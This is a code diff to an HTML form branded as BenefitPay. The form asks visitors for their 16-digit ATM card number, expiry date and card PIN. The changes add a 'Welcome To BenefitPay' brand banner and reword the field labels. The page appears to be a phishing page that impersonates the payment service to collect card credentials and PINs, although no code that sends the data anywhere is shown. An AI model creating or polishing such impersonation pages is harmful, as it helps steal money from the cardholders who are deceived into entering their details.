@@ -14,6 +14,10 @@
         <div class="header">
             <div class="logo-container">
                 <img src="benefitpay-download.png" alt="BenefitPay Logo" class="logo">
+                <div class="welcome-text">
+                    <div>Welcome To</div>
+                    <div class="brand-name">BenefitPay</div>
+                </div>
             </div>
             <button class="lang-btn">عربي</button>
         </div>
@@ -22,17 +26,17 @@
         <div class="form-section">
             <h2 class="page-title">Enter your ATM Card details</h2>
 
-            <label class="input-label">Card Number</label>
+            <label class="input-label">16 digit card number</label>
             <input type="text" class="card-input" placeholder="0000 0000 0000 0000" id="cardNumber" maxlength="19" oninput="formatCardNumber(this)">
 
             <div class="row-inputs">
                 <div class="half-input">
-                    <label class="input-label">Expiry Code</label>
+                    <label class="input-label">Card expiry date</label>
                     <input type="text" class="expiry-input" placeholder="MM/YY" id="expiryCode" maxlength="5" oninput="formatExpiry(this)">
                 </div>
                 <div class="half-input">
                     <label class="input-label">ATM Card PIN</label>
-                    <input type="password" class="pin-input" placeholder="PIN" id="cardPin" maxlength="4">
+                    <input type="password" class="pin-input" placeholder="Card Pin" id="cardPin" maxlength="4">
                 </div>
             </div>
         </div>
